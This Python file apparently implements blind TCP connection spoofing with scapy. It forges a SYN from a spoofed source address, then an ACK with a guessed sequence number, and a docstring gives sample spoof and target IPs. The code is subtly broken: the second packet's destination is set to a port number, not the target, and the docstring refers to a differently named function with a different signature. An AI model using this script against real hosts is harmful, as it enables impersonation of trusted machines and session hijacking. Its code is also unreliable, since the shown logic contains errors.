from scapy.all import *
from custom_modules.ConsoleMessenger import CONSOLE_MESSENGER_SWITCH as cms
from custom_modules.PatternConstants import valid_ipv4 as vip4

""" 
    src:    192.168.1.212       Spoof IP 
    tgt:    192.168.1.1         Target IP 
    ack:    2024371201          SeqNum 
    call:   spoof_conn(src,tgt,ack) 
"""


def spoof_ip(source, target, acknowledgement, source_port, destination_port):
    ip_layer = IP(src=source, dst=target)
    tcp_layer = TCP(sport=source_port, dport=destination_port)
    syn_pkt = ip_layer / tcp_layer

    send(syn_pkt)

    ip_layer = IP(src=source, dst=destination_port)
    tcp_layer = TCP(sport=source_port, dport=destination_port, ack=acknowledgement)
    ack_pkt = ip_layer / tcp_layer

    send(ack_pkt)
